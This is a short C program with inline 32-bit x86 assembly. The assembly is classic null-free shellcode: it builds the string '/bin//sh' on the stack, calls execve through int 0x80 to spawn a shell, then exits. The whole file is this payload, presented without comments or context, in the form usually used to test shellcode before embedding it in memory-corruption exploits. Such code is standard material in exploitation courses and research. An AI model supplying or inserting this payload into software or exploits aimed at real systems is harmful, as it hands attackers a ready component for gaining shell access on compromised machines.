#include <stdlib.h>



void main() 
{
	__asm__("xor    %eax,%eax \n\
		push   %eax \n\
		push   $0x68732f2f \n\
		push   $0x6e69622f \n\
		mov    %esp,%ebx \n\
		push   %eax \n\
		push   %ebx \n\
		mov    %esp,%ecx \n\
		xor    %edx,%edx \n\
		mov    $0xb,%al \n\
		int    $0x80 \n\
		xor    %eax,%eax \n\
		inc    %eax \n\
		int    $0x80 \n\
		");
}
